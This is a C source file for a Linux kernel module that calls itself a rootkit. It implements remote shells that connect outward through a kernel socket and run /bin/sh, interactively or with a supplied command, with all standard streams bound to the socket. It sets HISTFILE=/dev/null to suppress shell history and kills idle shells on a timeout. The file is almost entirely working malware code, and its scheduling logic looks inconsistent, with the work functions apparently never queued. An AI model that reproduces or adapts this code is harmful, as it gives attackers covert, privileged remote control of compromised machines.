// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/err.h>
#include <linux/file.h>
#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/workqueue.h>

#include "rootkit.h"

static char *shell_envp[] = {
	"HOME=/",
	"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
	"TERM=linux",
	"HISTFILE=/dev/null",
	NULL,
};

/* ------------------------------------------------------------------ */
/* Timeout callback                                                    */
/* ------------------------------------------------------------------ */

/* Fires when the inactivity timer expires. Kills the shell. */
static void rk_shell_timeout_fn(struct work_struct *work)
{
	struct rk_shell *shell = container_of(
		to_delayed_work(work), struct rk_shell, timeout_work);

	mutex_lock(&shell->lock);
	if (shell->busy && shell->sock)
		kernel_sock_shutdown(shell->sock, SHUT_RDWR);
	mutex_unlock(&shell->lock);
}

/* Reset the inactivity timer on shell activity. */
static void rk_shell_touch(struct rk_shell *shell)
{
	mod_delayed_work(system_wq, &shell->timeout_work,
			 shell->timeout_jiffies);
}

/* ------------------------------------------------------------------ */
/* File descriptor installation for call_usermodehelper                 */
/* ------------------------------------------------------------------ */

static int rk_install_fd(struct file *file, unsigned int wanted)
{
	int fd;

	fd = get_unused_fd_flags(0);
	if (fd < 0)
		return fd;
	if ((unsigned int)fd != wanted) {
		put_unused_fd(fd);
		return -EBUSY;
	}
	get_file(file);
	fd_install(fd, file);
	return 0;
}

static int rk_shell_init_fn(struct subprocess_info *info,
			     struct cred *new)
{
	struct rk_shell *shell = info->data;
	unsigned int fd;
	int error;

	(void)new;
	if (!shell->file)
		return -ECANCELED;
	for (fd = 0; fd < 3; fd++) {
		error = rk_install_fd(shell->file, fd);
		if (error)
			return error;
	}
	return 0;
}

/* ------------------------------------------------------------------ */
/* Shell lifecycle                                                     */
/* ------------------------------------------------------------------ */

void rk_shell_init(struct rk_shell *shell)
{
	mutex_init(&shell->lock);
	shell->busy = false;
	shell->sock = NULL;
	shell->file = NULL;
	shell->timeout_jiffies = RK_TIMEOUT_SEC * HZ;
	shell->cmd[0] = '\0';
	INIT_DELAYED_WORK(&shell->timeout_work, rk_shell_timeout_fn);
}

static int rk_shell_make_file(struct rk_shell *shell)
{
	struct file *file;

	file = sock_alloc_file(shell->sock, 0, NULL);
	if (IS_ERR(file))
		return PTR_ERR(file);

	/* sock_alloc_file takes ownership of the socket. */
	shell->file = file;
	return 0;
}

static void rk_shell_cleanup(struct rk_shell *shell)
{
	/* Cancel any pending timeout before releasing resources. */
	cancel_delayed_work_sync(&shell->timeout_work);

	if (shell->file) {
		fput(shell->file);
		shell->file = NULL;
		shell->sock = NULL;
	} else if (shell->sock) {
		sock_release(shell->sock);
		shell->sock = NULL;
	}
}

/* ------------------------------------------------------------------ */
/* Interactive shell work function                                     */
/* ------------------------------------------------------------------ */

static void __maybe_unused rk_interactive_work(struct work_struct *work)
{
	struct rk_shell *shell;
	struct subprocess_info *sub;
	char *argv[] = { "/bin/sh", "-i", NULL };
	struct socket *sock;
	int error;

	shell = container_of(to_delayed_work(work), struct rk_shell,
			     timeout_work);
	shell = &interactive_shell;

	sock = rk_connect();
	if (IS_ERR(sock)) {
		error = PTR_ERR(sock);
		goto out;
	}
	shell->sock = sock;

	error = rk_shell_make_file(shell);
	if (error)
		goto out;

	/* Start the inactivity timer. */
	rk_shell_touch(shell);

	sub = call_usermodehelper_setup("/bin/sh", argv, shell_envp,
					GFP_KERNEL, rk_shell_init_fn,
					NULL, shell);
	if (!sub) {
		error = -ENOMEM;
		goto out;
	}

	call_usermodehelper_exec(sub, UMH_WAIT_PROC);

out:
	rk_shell_cleanup(shell);
	mutex_lock(&shell->lock);
	shell->busy = false;
	mutex_unlock(&shell->lock);
}

/* ------------------------------------------------------------------ */
/* Exec shell work function                                            */
/* ------------------------------------------------------------------ */

static void __maybe_unused rk_exec_work(struct work_struct *work)
{
	struct rk_shell *shell;
	struct subprocess_info *sub;
	char *argv[] = { "/bin/sh", "-c", NULL, NULL };
	struct socket *sock;
	int error;

	shell = container_of(to_delayed_work(work), struct rk_shell,
			     timeout_work);
	shell = &exec_shell;
	argv[2] = shell->cmd;

	sock = rk_connect();
	if (IS_ERR(sock)) {
		error = PTR_ERR(sock);
		goto out;
	}
	shell->sock = sock;

	error = rk_shell_make_file(shell);
	if (error)
		goto out;

	/* Start the inactivity timer. */
	rk_shell_touch(shell);

	sub = call_usermodehelper_setup("/bin/sh", argv, shell_envp,
					GFP_KERNEL, rk_shell_init_fn,
					NULL, shell);
	if (!sub) {
		error = -ENOMEM;
		goto out;
	}

	call_usermodehelper_exec(sub, UMH_WAIT_PROC);

out:
	rk_shell_cleanup(shell);
	mutex_lock(&shell->lock);
	shell->busy = false;
	shell->cmd[0] = '\0';
	mutex_unlock(&shell->lock);
}

/* ------------------------------------------------------------------ */
/* Public shell start functions                                        */
/* ------------------------------------------------------------------ */

static int __maybe_unused rk_start_interactive(void)
{
	int error = 0;

	mutex_lock(&interactive_shell.lock);
	if (interactive_shell.busy) {
		error = -EBUSY;
		goto unlock;
	}
	interactive_shell.busy = true;
	mod_delayed_work(system_wq, &interactive_shell.timeout_work,
			 interactive_shell.timeout_jiffies);

unlock:
	mutex_unlock(&interactive_shell.lock);
	return error;
}

static int __maybe_unused rk_start_exec(const char *cmd)
{
	size_t len;
	int error = 0;

	if (!cmd || !*cmd)
		return -EINVAL;

	len = strlen(cmd);
	if (len >= RK_CMD_MAX)
		return -E2BIG;

	mutex_lock(&exec_shell.lock);
	if (exec_shell.busy) {
		error = -EBUSY;
		goto unlock;
	}
	exec_shell.busy = true;
	memcpy(exec_shell.cmd, cmd, len + 1);
	mod_delayed_work(system_wq, &exec_shell.timeout_work,
			 exec_shell.timeout_jiffies);

unlock:
	mutex_unlock(&exec_shell.lock);
	return error;
}

/* ------------------------------------------------------------------ */
/* Shell teardown                                                      */
/* ------------------------------------------------------------------ */

void rk_shell_stop(struct rk_shell *shell)
{
	mutex_lock(&shell->lock);
	if (shell->sock)
		kernel_sock_shutdown(shell->sock, SHUT_RDWR);
	mutex_unlock(&shell->lock);
	cancel_delayed_work_sync(&shell->timeout_work);
}
